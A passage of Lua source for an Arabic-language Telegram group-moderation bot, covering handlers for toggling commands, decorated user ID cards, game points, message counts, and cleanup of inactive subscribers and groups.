send(msg.chat_id_, msg.id_,'* ⊀︰ شنـو نسيـت دخلت منرابـط..🕸️*') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيل امـࢪـ منو ضـافنـي..🕸️*') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = '* ⊀︰ تـم تفعيل امـࢪ مـنو ضافنـي*'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = '* ⊀︰  تـࢪه مفـعلۿ ولحـمزه..🕸️*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' and Manager(msg) then  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل امـࢪ مـنو ضافنـي*'
else
Text = '\n *⊀︰ مـقـفوله ولـحمزۿ..🕸️*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = '* ⊀︰ تم تفعيل امر صيح*'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل امر صيح*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'نزل جميع الرتب' and BasicConstructor(msg) then  
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⊀︰ تم نزل الكل من الرتب الاتيه \n ⊀︰ المميزين ، الادمنيه ، المدراء ، المنشئين \n')
end
if text == 'تعطيل صيح' and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n *⊀︰ تـم عطلـت امر صيـح..🕸️*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل امر صيح*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' *⊀︰ تم تفعيل امر اطردني*'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' *⊀︰ بالتاكيد تم تفعيل امر اطردني*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' and Manager(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل امر اطردني*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل امر اطردني*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"* ⊀︰ امـࢪ صورتي معطـل*") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ⊀︰ عدد صورك < "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == 'تغير الايدي' and Manager(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[⊀︰ ᴜѕᴇʀɴᴀᴍᴇ ➥⊀︰  #username .
⊀︰ ᴍѕɢѕ ➥⊀︰  #msgs .
⊀︰ ѕᴛᴀᴛѕ ➥⊀︰  #stast .
⊀︰ ʏᴏᴜʀ ɪᴅ ➥⊀︰  #id  .
⊀︰ ᴇᴅɪᴛ ᴍsɢ ➥⊀︰  #edit .
⊀︰ ᴅᴇᴛᴀɪʟs ➥⊀︰  #auto . 
⊀︰ ɢᴀᴍᴇ ➥⊀︰  #game .]],
[[
> 𝒔𝒕𝒂𓂅 #stast . 🕸️
> 𝒖𝒔𝒆𝒓𓂅 #username . 🕸️
> 𝒎𝒔𝒈𝒆𓂅 #msgs . 🕸️
> 𝒊𝒅 𓂅 #id . 🕸️
]],
[[
🍼 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ●
⊀︰  🕸️ | 𝑼𝑬𝑺 : #username ‌‌‏🕸️
⊀︰  🕸️ | 𝑺𝑻𝑨 : #stast  🕸️
⊀︰  🕸️ | 𝑰𝑫 : #id ‌‌‏🕸️
⊀︰  🕸️ | 𝑴𝑺𝑮 : #msgs 🕸️
]],
[[
●⊀︰  𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
●⊀︰  𝐌𝐒𝐆𝐒 𖠰 #msgs .
●⊀︰  𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
●⊀︰  𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
●⊀︰  𝐀𝐔𝐓𝐎 𖠰 #auto .
●⊀︰  𝗖𝗢𝗠𝗠𝗘𝗡𝗧 𖠰 #comment .
●⊀︰  𝗘𝗗𝗜𝗧 𖠰 #edit .
]],
[[
𓄼🇬🇧 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 :#username 
𓄼🇬🇧 𝑺𝒕𝒂𝒔𝒕 :#stast 
𓄼🇬🇧 𝒊𝒅 :#id 
𓄼🇬🇧 𝑮𝒂𝒎𝒆𝑺 :#game 
𓄼🇬🇧 𝑴𝒔𝒈𝒔 :#msgs
]],
[[
𝟔𝟔𝟔 𖡋 #username ⊀︰  
𝟔𝟔𝟔 𖡋  #stast 
𝟔𝟔𝟔 𖡋 #id ⊀︰  
𝟔𝟔𝟔 𖡋 #game ⊀︰  
𝟔𝟔𝟔 𖡋 #msgs ⊀︰  
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸🕸️
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸🕸️
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸🕸️
➞: 𝒊𝒅 𓂅 #id 𓍯➸🕸️
]],
[[
☆⊀︰ 𝐮𝐬𝐞𝐫 : #username 𖣬  
☆⊀︰ 𝐦𝐬𝐠  : #msgs 𖣬 
☆⊀︰ 𝐬𝐭𝐚 : #stast 𖣬 
☆⊀︰ 𝐢𝐝  : #id 𖣬
]],
[[
⌔︙Msgs : #msgs .
⌔︙ID : #id .
⌔︙Stast : #stast .
⌔︙UserName : #username .
]],
[[
.✧ 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.✧ 𝙨𝙩𝙖𝙨𝙩 , #stast  
.✧ 𝙡𝘿 , #id  
.✧ 𝙂𝙖𝙢𝙨 , #game 
.✧ 𝙢𝙨𝙂𝙨 , #msgs
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'*⊀︰ غيـࢪت الايدي يكـيك دز ايدي وشوفـه..🕸️*')
end
if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mode,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشـࢪف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عـضو'
end
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (mode.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local modea = {
" اخخ لو يلـزمك وائل يشبـعك حلـوك",
" ⊀︰ مـوش صوࢪه حلغـوم..🍭",
" ⊀︰ جهرتك منورة ",
" ⊀︰ هاي شكد حلو انتة",
" ⊀︰ اصلا حسـون احلئ",
" ⊀︰ اصلا وائـل احلئ",
" ⊀︰ فديت الصاك محح",
" ⊀︰ فـدشـي عمـي",
" ⊀︰ دغـيرهـا شبـي هـاذ",
" ⊀︰ شهل الگيمر ",
" ⊀︰ شهل الصوره تخمبش ",
" ⊀︰ فديت الحلو ",
" ⊀︰ اذا الـࢪ࣪م شفـتك اشلـعه..🍼 ",
}
local rdphoto = modea[math.random(#modea)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, mode.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n ⊀︰ خـلي صوره بلاول بࢪو..🕸️ \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, mode.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n ⊀︰ 𝗂𝖣 ↬'..msg.sender_user_id_..'\n ⊀︰ 𝖴𝖲𝖾𝖱 𝖺𝖬𝖾 ↬ '..username..'\n ⊀︰ 𝖲𝗍𝖺𝖲𝗍 ↬'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ⊀︰ 𝖯𝗈𝗐𝖾𝖱 ↬'..rtpa..'\n ⊀︰ 𝖬𝗌𝖦𝖲 ↬'..Msguser..'\n ⊀︰ 𝗆𝗂𝖲𝗍𝖺𝖪𝖤𝗌 ↬ '..edit..'\n ⊀︰ 𝖣𝗈𝗍 ↬ '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n ⊀︰ 𝗂𝖣 ↬'..msg.sender_user_id_..'\n ⊀︰ معرفك < '..username..'\n ⊀︰ 𝖲𝗍𝖺𝖲𝗍 ↬'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ⊀︰ 𝖯𝗈𝗐𝖾𝖱 ↬'..rtpa..'\n ⊀︰ 𝖬𝗌𝖦𝖲 ↬'..Msguser..'\n ⊀︰ 𝗆𝗂𝖲𝗍𝖺𝖪𝖤𝗌 ↬ '..edit..'\n ⊀︰ 𝖣𝗈𝗍 ↬ '..NUMPGAME..']\n')
else
send(msg.chat_id_, msg.id_, '\n ⊀︰ الصوره < ليس لديك صور في حسابك'..'[\n ⊀︰ 𝗂𝖣 ↬'..msg.sender_user_id_..'\n ⊀︰ 𝖴𝖲𝖾𝖱 𝖭𝖺𝖬𝖾 ↬ '..username..'\n ⊀︰ 𝖲𝗍𝖺𝖲𝗍 ↬'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ⊀︰ 𝖯𝗈𝗐𝖾𝖱 ↬'..rtpa..'\n ⊀︰ 𝖬𝗌𝖦𝖲 ↬'..Msguser..'\n ⊀︰ 𝗆𝗂𝖲𝗍𝖺𝖪𝖤𝗌 ↬ '..edit..'\n ⊀︰ 𝖣𝗈𝗍 ↬ '..NUMPGAME..']\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n ⊀︰ 𝗂𝖣 ↬'..msg.sender_user_id_..'\n ⊀︰ 𝖴𝖲𝖾𝖱 𝖭𝖺𝖬𝖾 ↬ '..username..'\n ⊀︰ 𝖲𝗍𝖺𝖲𝗍 ↬'..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ⊀︰ 𝖯𝗈𝗐𝖾𝖱 ↬'..rtpa..'\n ⊀︰ 𝖬𝗌𝖦𝖲 ↬'..Msguser..'\n ⊀︰ 𝗆𝗂𝖲𝗍𝖺𝖪𝖤𝗌 ↬ '..edit..'\n ⊀︰ 𝖣𝗈𝗍 ↬ '..NUMPGAME..']\n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == 'سحكاتي' or text == 'تعديلاتي' then 
local Num = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
if Num == 0 then 
Text = ' *⊀︰ ماعـندك ولا جفـصه خوش تكتـب*'
else
Text = '* ⊀︰ جكـد تجفص دكتـب عدل >* { '..Num..' }'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم مسح 𝗆𝗂𝖲𝗍𝖺𝖪𝖤𝗌 يلعـارر..🕸️*'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم مسـح جۿاتـك*'  )  
database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text == 'جهاتي' or text == 'شكد ضفت' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
if Num == 0 then 
Text = '* ⊀︰ ما ضـايف ولا عضـو *'
else
Text = '* ⊀︰ عـدد جهـاتك يحـلوو..🕸️ >* { '..Num..' } '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تنظيف المشتركين" and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'- بـࢪو ماتڪدࢪ تستعمل البـوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,' ⊀︰ ماكـو ولا مشتـرك وهمـي..🕸️ \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ⊀︰ عـدد المشتركيـن..🕸️ > ( '..#pv..' )\n- تم ازالة > ( '..sendok..' ) من المشتركين\n- الان عدد المشتركين الحقيقي > ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات" and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'- بـࢪو ماتڪدࢪ تستعمل البـوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,' ⊀︰ لا يوجد كروبات وهميه في البوت\n')   
else
local RiNdA = (w + q)
local sendok = #group - RiNdA
if q == 0 then
RiNdA = ''
else
RiNdA = '\n- تم ازالة > { '..q..' } كروبات من البوت'
end
if w == 0 then
RiNdAk = ''
else
RiNdAk = '\n- تم ازالة > {'..w..'} كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,' ⊀︰ عدد الكروبات الان > { '..#group..' }'..RiNdAk..''..RiNdA..'\n*- الان عدد الكروبات الحقيقي > { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^(gpinfo)$") or text and text:match("^معلومات الكروب$") then
function gpinfo(arg,data)
-- vardump(data) 
RiNdAdx(msg.chat_id_, msg.id_, ' ⊀︰ ايـدي الڪࢪوب..🕸️ > ( '..msg.chat_id_..' )\n ⊀︰ عدد المشࢪفيـن..🕸️ > ( *'..data.administrator_count_..' )*\n ⊀︰ عدد المحظورين..🕸️ > ( *'..data.kicked_count_..' )*\n ⊀︰ عدد الاعضاء..🕸️ > ( *'..data.member_count_..' )*\n', 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
-----------
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "* ⊀︰ تم الغاء الامر *") 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'id:user'..msg.chat_id_)  
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
send(msg.chat_id_, msg.id_," ⊀︰ تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id..'idgem:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "* ⊀︰ تم الغاء الامر *") 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id..'idgem:user'..msg.chat_id_)  
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,  1, "⊀︰ .| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
mode = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,mode)  
database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '* ⊀︰ ارسل لي عدد الرسائل الان*') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
mode = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,mode)  
database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, '* ⊀︰ ارسل لي عدد النقاط التي تريد اضافتها*') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_," ⊀︰ تم اضافة له {"..Num..'} من النقاط')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n ⊀︰ تم اضافة له {"..Num..'} من الرسائل')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'نقاط' or text == 'نقاطي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌯︰لا تستطيع استخدام البوت \n  ⌯︰يرجى الاشتراك بالقناه اولا \n  ⌯︰اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = '* ماعـندك نقاط اكتب الالعاب وجمـع*'
else
Text = '* ⌯︰عـدد نقـاطك بـࢪو..🍒 >* { '..Num..' } نقطه '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌯︰لا تستطيع استخدام البوت \n  ⌯︰يرجى الاشتراك بالقناه اولا \n  ⌯︰اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n* ⌯︰لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,' ⌯︰ليس لديك نقاط في الالعاب\n ⌯︰اذا كنت تريد ربح نقاط \n ⌯︰ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n ⌯︰ليس لديك نقاط في هذه لعبه \n ⌯︰لزيادة نقاطك في اللعبه \n ⌯︰ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,' ⌯︰تم خصم *> { '..NUMPY..' }* من نقاطك \n ⌯︰وتم اضافة* > { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
if text == 'فحص البوتت' and Manager(msg) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '√' else info = '×' end
if Json_Info.result.can_delete_messages == true then
delete = '√' else delete = '×' end
if Json_Info.result.can_invite_users == true then
invite = '√' else invite = '×' end
if Json_Info.result.can_pin_messages == true then
pin = '√' else pin = '×' end
if Json_Info.result.can_restrict_members == true then
restrict = '√' else restrict = '×' end
if Json_Info.result.can_promote_members == true then
promote = '√' else promote = '×' end 
send(msg.chat_id_,msg.id_,'\n ⊀︰ اهلا عزيزي البوت هنا ادمن'..'\n ⊀︰ وصلاحياته هي ↓ \nٴ━━━━━━━━━━'..'\n ⊀︰ تغير معلومات الكروب ↫ ❴ '..info..' ❵'..'\n ⊀︰ حذف الرسائل ↫ ❴ '..delete..' ❵'..'\n ⊀︰ حظر المستخدمين ↫ ❴ '..restrict..' ❵'..'\n ⊀︰ دعوة مستخدمين ↫ ❴ '..invite..' ❵'..'\n ⊀︰ تثبيت الرسائل ↫ ❴ '..pin..' ❵'..'\n ⊀︰ اضافة مشرفين جدد ↫ ❴ '..promote..' ❵')   
end
end
end


if text and text:match("^غير اسم المطور (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم المطور (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المطور الى > "..Teext)
end
if text and text:match("^غير اسم المالك (.*)$") and Manager(msg) then
local Teext = text:match("^غير اسم المالك (.*)$") 
database:set(bot_id.."CoSu:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_," ⊀︰ تم غير اسم المالك الى > "..Teext)
end
if text and text:match("^غير اسم منشئ الاساسي (.*)$") and Manager(msg) then
